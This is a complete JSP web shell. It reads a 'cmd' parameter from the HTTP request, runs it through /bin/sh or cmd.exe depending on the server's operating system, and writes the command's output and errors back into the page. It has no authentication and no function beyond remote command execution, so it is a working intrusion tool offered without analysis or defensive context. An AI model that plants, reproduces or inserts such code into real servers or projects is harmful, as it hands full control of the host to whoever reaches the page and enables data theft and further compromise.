<%@ page contentType="text/html; charset=UTF-8"%>
<%@ page import="java.io.*"%>
<%
	String shell_1 = "/bin/sh";
	String shell_2 = "-c";
	if (System.getProperty("os.name").toLowerCase().indexOf("windows") > -1) {
		shell_1 = "cmd.exe";
		shell_2 = "/c";
	}
	String cmd = request.getParameter("cmd");
	String output = "";
	if (cmd != null) {
		String s = null;
		try {
			Process p = Runtime.getRuntime().exec(new String[] { shell_1, shell_2, cmd });
			BufferedReader sI = new BufferedReader(new InputStreamReader(p.getInputStream()));
			while ((s = sI.readLine()) != null) {
				output += s + "\r";
			}
			BufferedReader sI1 = new BufferedReader(new InputStreamReader(p.getErrorStream()));
			while ((s = sI1.readLine()) != null) {
				output += s + "\r";
			}
		} catch (IOException e) {
			e.printStackTrace();
		}
	}
%>
<pre> <%=output%> </pre>